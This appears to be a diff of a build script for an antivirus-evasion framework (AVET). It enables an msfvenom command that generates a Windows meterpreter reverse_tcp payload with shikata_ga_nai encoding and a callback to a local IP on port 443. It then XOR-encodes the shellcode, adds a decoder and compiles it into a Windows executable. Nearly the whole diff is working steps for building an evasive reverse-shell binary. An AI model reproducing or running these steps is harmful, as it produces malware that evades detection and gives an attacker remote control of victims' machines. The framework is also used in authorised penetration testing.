@@ -18,7 +18,7 @@ LHOST=$GLOBAL_LHOST
 
 # generate payload
 #msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > output/thepayload.bin
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -30,16 +30,16 @@ append_value HOSTVALUE "this.that" source/evasion/evasion.include
 #add_evasion hide_console
 
 # set shellcode source
-set_shellcode_source dynamic_from_file
-
-# set key source
-set_key_source none
+set_shellcode_source static_from_file input/sc.txt
 
 # encode shellcode
-#encode_shellcode xor 
+encode_shellcode xor input/sc.txt input/scenc.txt input/key.txt
+
+# set key source
+set_key_source static_from_file input/key.txt
 
 # set decoder
-set_decoder none
+set_decoder xor
 
 # set shellcode binding technique
 set_shellcode_binding exec_shellcode
@@ -48,7 +48,7 @@ set_shellcode_binding exec_shellcode
 enable_debug_print
 
 # compile
-$win32_compiler -o output/pwn.exe source/avet.c -lws2_32
+$win32_compiler -o output/output.exe source/avet.c -lws2_32
 
 # cleanup
 #rm output/thepayload.bin
